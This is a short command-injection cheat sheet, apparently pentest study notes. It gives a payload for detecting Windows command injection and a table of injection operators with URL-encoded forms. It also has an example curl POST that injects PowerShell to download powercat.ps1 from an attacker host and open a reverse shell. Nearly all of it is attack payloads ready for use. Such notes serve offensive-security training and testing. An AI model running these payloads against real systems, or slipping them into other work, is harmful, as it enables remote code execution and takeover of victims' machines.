# Command Injection

### 1) Identification

Detect Windows Command Injection

    (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell

Execute command example

    curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F<ATTACKER_IP>%2Fpowercat.ps1%22)%3Bpowercat%20-c%20<ATTACKER_IP>%20-p%20<PORT>%20-e%20powershell' http://<TARGET>:<PORT>/archive

### 2) Command Methods

The only exception may be the semi-colon ;, which will not work if the command was being executed with Windows Command Line (CMD), but would still work if it was being executed with Windows PowerShell.

| Injection Operator | Injection Character | URL-Encoded Character | Executed Command                         |
|--------------------|---------------------|-----------------------|------------------------------------------|
| Semicolon          | `;`                 | `%3b`                 | Both                                     |
| New Line           | *(newline)*         | `%0a`                 | Both                                     |
| Background         | `&`                 | `%26`                 | Both (second output generally shown first) |
| Pipe               | `|`                 | `%7c`                 | Both (only second output is shown)       |
| AND                | `&&`                | `%26%26`              | Both (only if first succeeds)            |
| OR                 | `||`                | `%7c%7c`              | Second (only if first fails)             |
| Sub-Shell          | `` `` ``            | `%60%60`              | Both (Linux-only)                        |
| Sub-Shell          | `$( )`              | `%24%28%29`           | Both (Linux-only)                        |
